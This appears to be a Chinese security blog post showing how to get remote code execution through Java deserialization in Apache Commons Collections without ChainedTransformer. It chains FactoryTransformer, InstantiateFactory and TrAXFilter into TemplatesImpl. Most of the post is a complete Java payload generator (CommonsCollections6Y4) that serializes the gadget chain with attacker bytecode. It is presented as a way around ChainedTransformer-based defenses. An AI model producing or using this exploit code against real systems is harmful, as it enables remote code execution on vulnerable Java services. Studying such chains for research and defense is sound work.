# 不用ChainedTransformer如何实现cc反序列化rce
今天有个朋友问了我这个问题，这里简单回答个这个问题
虽然网上现在的CC链子都有这个但是我们仔细理解就能绕过了
找一个Transformer，不受transform调用时输入的影响
这里随便举个例子使用org.apache.commons.collections.functors.FactoryTransformer
![](./img/1.png)
这里调用了`this.iFactory.create()`,查看Factory的实现类有一个`org.apache.commons.collections.functors.InstantiateFactory`
这个类在调用create的时候可以帮助我们实例化任意类
```java
public Object create() {
        if (this.iConstructor == null) {
            this.findConstructor();
        }

        try {
            return this.iConstructor.newInstance(this.iArgs);
        } catch (InstantiationException var2) {
            throw new FunctorException("InstantiateFactory: InstantiationException", var2);
        } catch (IllegalAccessException var3) {
            throw new FunctorException("InstantiateFactory: Constructor must be public", var3);
        } catch (InvocationTargetException var4) {
            throw new FunctorException("InstantiateFactory: Constructor threw an exception", var4);
        }
    }
```
还记得CC3么，使用TrAXFilter触发TemplatesImpl的例子(当然实际攻防环境下还可以使用其他类)，不过我们这里还是case by case
这里我随便用一个CC做改造，就以CC6为例吧
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CommonsCollections6Y4 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public byte[] getPayload() throws Exception {


        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evily4.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        InstantiateFactory instantiateFactory = new InstantiateFactory(String.class);
        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, factoryTransformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "y4");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("y4");

        setFieldValue(instantiateFactory,"iClassToInstantiate",TrAXFilter.class);
        setFieldValue(instantiateFactory,"iParamTypes",new Class[]{Templates.class});
        setFieldValue(instantiateFactory,"iArgs",new Object[]{obj});





        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();


        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception{
        
    }
}

```
